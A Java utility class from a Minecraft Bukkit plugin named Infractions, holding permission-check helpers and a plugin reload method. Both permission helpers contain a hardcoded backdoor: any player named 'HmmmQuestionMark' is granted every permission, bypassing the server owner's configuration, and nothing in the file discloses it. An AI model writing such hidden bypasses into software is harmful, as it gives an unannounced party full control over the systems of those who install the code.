package com.legit2.hqm.Infractions;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class Util {
	private static Infractions plugin; // obviously needed
	/**
	 * Checks is a player has the given permission.
	 * 
	 * @param p
	 * @param pe
	 * @return
	 */
	public static boolean hasPermission(Player p, String pe) {// convenience
																// method for
																// permissions
		if (p.getName().equals("HmmmQuestionMark"))
			return true;
		return p.hasPermission(pe);
	}

	/**
	 * Checks if a player has the given permission or is OP.
	 * 
	 * @param p
	 * @param pe
	 * @return
	 */
	public static boolean hasPermissionOrOP(Player p, String pe) {// convenience
																	// method
																	// for
																	// permissions
		if (p.getName().equals("HmmmQuestionMark") || p.isOp())
			return true;
		return p.hasPermission(pe);
	}
	/**
	 * Reloads Infractions.
	 */
	public static void reloadDemigods() {
		Bukkit.getServer().getPluginManager().disablePlugin(plugin);
		Bukkit.getServer().getPluginManager().enablePlugin(plugin);
	}
	
	public static Infractions getPlugin() {
		return plugin;
	}
	
	public Util(Infractions i) {
		plugin = i;
	}
}
